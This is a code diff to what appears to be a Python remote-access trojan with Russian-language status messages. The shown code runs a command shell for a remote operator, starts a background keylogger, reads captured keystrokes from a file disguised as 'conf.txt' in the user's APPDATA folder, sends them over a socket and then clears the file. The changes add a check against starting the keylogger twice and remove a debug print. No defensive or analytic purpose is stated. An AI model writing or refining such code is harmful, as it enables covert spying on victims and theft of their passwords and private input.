@@ -161,14 +161,13 @@ def execute_command(sock, command):
 
 def send_keylog_file(sock):
     try:
-        keylogger_path = os.path.join(os.environ["APPDATA"], "conf.txt")
+        keylogger_path = os.path.join(os.environ["APPDATA"], "\\conf.txt")
         if not os.path.exists(keylogger_path):
             reliable_send("[!!] Файл кейлогера отсутствует", sock)
             return
 
         with open(keylogger_path, "r", encoding="utf-8") as file:
             logs = file.read().strip()
-            print(f"Отправляемые логи: {logs}")  # Для отладки
             if logs:
                 reliable_send(logs, sock)
                 with open(keylogger_path, "w", encoding="utf-8") as file:
@@ -191,7 +190,6 @@ def shell(sock):
                 logging.info("[+] Клиент закрыт")
                 sock.close()
                 sys.exit(0)
-
             elif command.startswith("cd"):
                 try:
                     os.chdir(command[3:])
@@ -217,9 +215,12 @@ def shell(sock):
             elif command.startswith("check"):
                 is_admin(sock)
             elif command.startswith("keylog_start"):
-                t1 = threading.Thread(target=keylogger.start, daemon=True)
-                t1.start()
-                reliable_send("[+] Кейлоггер запущен", sock)
+                if not keylogger.running:
+                    t1 = threading.Thread(target=keylogger.start, daemon=True)
+                    t1.start()
+                    reliable_send("[+] Кейлоггер запущен", sock)
+                else:
+                    reliable_send("[!!] Кейлоггер уже запущен", sock)
             elif command.startswith("keylog_dump"):
                 send_keylog_file(sock)
             else:
